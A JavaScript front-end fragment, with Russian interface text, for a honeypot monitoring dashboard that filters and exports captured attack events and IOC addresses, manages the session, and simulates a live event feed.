armed($("p-delete"), "Точно удалить?", () => {
  const name = S.editing;
  if (traps.some((t) => t.profile === name)) { toast("Профиль используется ловушками: сначала смените им тип", true); return; }
  profiles.splice(profiles.indexOf(profileByName(name)), 1);
  clearEditor(); setEditing(null); renderAll(); toast("Профиль удалён");
});

// ============ ПАНЕЛЬ ============
$("nav").onclick = (e) => { const tab = e.target.dataset && e.target.dataset.tab; if (tab) showTab(tab); };
$("f-type").onchange = (e) => setFilter({ type: e.target.value });
$("f-trap").onchange = (e) => setFilter({ trap: e.target.value });
$("f-q").oninput = (e) => { S.filter.q = e.target.value; renderFeed(); renderTops(true); };
$("f-reset").onclick = () => setFilter({ type: "", trap: "", q: "" });
$("f-clear").onclick = () => { S.events.length = 0; renderFeed(); toast("Лента очищена"); };
$("f-pause").onclick = () => { S.paused = !S.paused; $("f-pause").textContent = S.paused ? "▶ Продолжить" : "⏸ Пауза"; toast(S.paused ? "Поток остановлен" : "Поток возобновлён"); };
$("f-csv").onclick = () => {
  const rows = S.events.filter(matches);
  if (!rows.length) { toast("Нечего экспортировать", true); return; }
  const head = ["id", "time", "machine", "trap", "type", "src_ip", "src_port", "dst_port", "proto", "username", "password", "command"];
  const lines = rows.map((e) => [e.id, new Date(e.ts).toISOString(), e.container, e.trap, e.type, e.src_ip, e.src_port, e.dst_port, e.proto, e.username, e.password, e.command].map(csvCell).join(","));
  download("events.csv", [head.join(","), ...lines].join("\n")); toast("Экспортировано событий: " + rows.length);
};
$("ioc-csv").onclick = () => {
  const lines = Object.entries(S.src).sort((a, b) => b[1] - a[1]).map(([ip, n]) => [ip, n].map(csvCell).join(","));
  download("iocs.csv", ["ip,events", ...lines].join("\n")); toast("Экспортировано IP: " + lines.length);
};
makeClickable($("kpi-total"), () => { setFilter({ type: "", trap: "", q: "" }); toast("Фильтры сброшены"); });
makeClickable($("kpi-auth"), () => setFilter({ type: "auth_attempt", trap: "", q: "" }));
makeClickable($("kpi-alert"), () => setFilter({ type: "alert", trap: "", q: "" }));
makeClickable($("kpi-online"), () => { showTab("containers"); S.cFilter.status = "online"; $("c-status").value = "online"; renderContainers(); });

// ============ СЕССИЯ ============
$("logout").onclick = async () => {
  try { await fetch("/api/auth/logout", { method: "POST", credentials: "same-origin", headers: { "X-CSRF-Token": csrf } }); }
  catch (_) { /* уходим на вход в любом случае */ }
  location.replace("/");
};
fetch("/api/auth/me", { credentials: "same-origin" })
  .then((r) => { if (!r.ok) throw new Error("no session"); return r.json(); })
  .then((d) => { csrf = d.csrf; $("who").textContent = d.username; $("role").textContent = d.role; })
  .catch(() => location.replace("/"));  // нет сессии: на страницу входа

// ============ ЗАПУСК ============
for (let i = 0; i < 16; i++) { const ev = fakeEvent(); if (ev) { ev.ts = Date.now() - (16 - i) * rnd(4000, 9000); S.events.unshift(ev); } }
renderLegend(); renderAll(); renderFeed(); renderTops(true);

function refreshCells() {  // текст обновляется на месте — карточки и строки не пересоздаются
  for (const n of document.querySelectorAll(".c-seen")) { const c = containers.find((x) => String(x.id) === n.dataset.c); if (c) n.textContent = since(c.seen); }
  for (const n of document.querySelectorAll("[data-trap].ev, [data-trap].c-ev")) { const t = traps.find((x) => String(x.id) === n.dataset.trap); if (t) n.textContent = String(t.events); }
}
setInterval(() => {
  if (S.paused) return;
  const ev = fakeEvent(); if (!ev) return;
  ingest(ev); addToFeed(ev); renderKpis(); renderTops(); refreshCells();
}, 1800);
setInterval(() => { for (const c of containers) if (cState(c) === "online" && Math.random() > 0.3) c.seen = Date.now() - rnd(0, 8) * 1000; refreshCells(); }, 4000);
setInterval(() => { S.buckets.shift(); S.buckets.push(0); renderKpis(); }, 60000);
